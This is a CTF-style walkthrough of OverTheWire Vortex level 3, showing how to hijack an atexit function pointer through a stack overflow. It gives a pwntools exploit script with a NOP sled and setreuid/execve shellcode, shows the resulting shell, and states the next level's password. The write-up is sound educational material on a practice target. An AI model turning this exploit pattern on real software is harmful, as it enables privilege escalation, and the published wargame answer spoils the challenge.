# Vortex Level 3 → 4

## Goal

`vortex3` is a stack overflow that doesn't directly overwrite the saved return address — instead, you overwrite a **function pointer** in the `atexit` handler list, so control flow jumps to your shellcode when the program calls `exit()`. 132-byte filler brings you to the target location; the jump address redirects into an `atexit`-style slot at `0x0804b1e0` via a stub at `0x08049052`.

## Concepts you'll learn

- `atexit` / cleanup function pointers as hijackable targets — an alternative to saved return addresses
- Why overwriting a callback that's guaranteed to fire (via `exit` or program termination) is a reliable exploitation primitive
- Reusing the NOP-sled + shellcode pattern, just aimed at a different dispatch mechanism

## Walkthrough

### 1. Find the target

In `gdb`, inspect the binary's atexit list — often an array of pointers called `_dtor_list` or similar. avishai's solve reports the functional pointer is at `0x0804b1e0`, and the stub at `0x08049052` iterates that list.

### 2. Determine overflow offset

```bash
$ gdb -q /vortex/vortex3
(gdb) r $(python3 -c "from pwn import *; sys.stdout.buffer.write(cyclic(300))")
# crash
(gdb) i r eip
```

Offset: **132** bytes to the pointer you'll clobber.

### 3. Build payload

```
[ 50-byte NOP sled ][ 28-byte shellcode ][ filler to offset 132 ][ pointer to NOP sled ]
```

The shellcode should do `geteuid()` → `setreuid(euid, euid)` → `execve("/bin/sh")` so the resulting shell keeps elevated privileges.

```python
# level3.py
from pwn import *
context(arch='i386', os='linux')
sc = asm(shellcraft.setreuid() + shellcraft.execve("/bin//sh"))

buf_addr = 0xffffd500     # derive from gdb — address inside your NOP sled
payload = b"\x90"*50 + sc + b"A"*(132 - 50 - len(sc)) + p32(buf_addr)
sys.stdout.buffer.write(payload)
```

### 4. Fire

```bash
$ (python3 level3.py; cat) | /vortex/vortex3
$ whoami
vortex4
$ cat /etc/vortex_pass/vortex4
v9kEqvkkq
```

## The answer

The password for `vortex4` is:

**`v9kEqvkkq`**

> ⚠️ OverTheWire may rotate passwords without notice. This value was correct at the time the level was solved — if it fails for you, re-solve the level using the method above rather than assuming the writeup is wrong.

## Reference

- Official level page: <https://overthewire.org/wargames/vortex/vortex3.html>
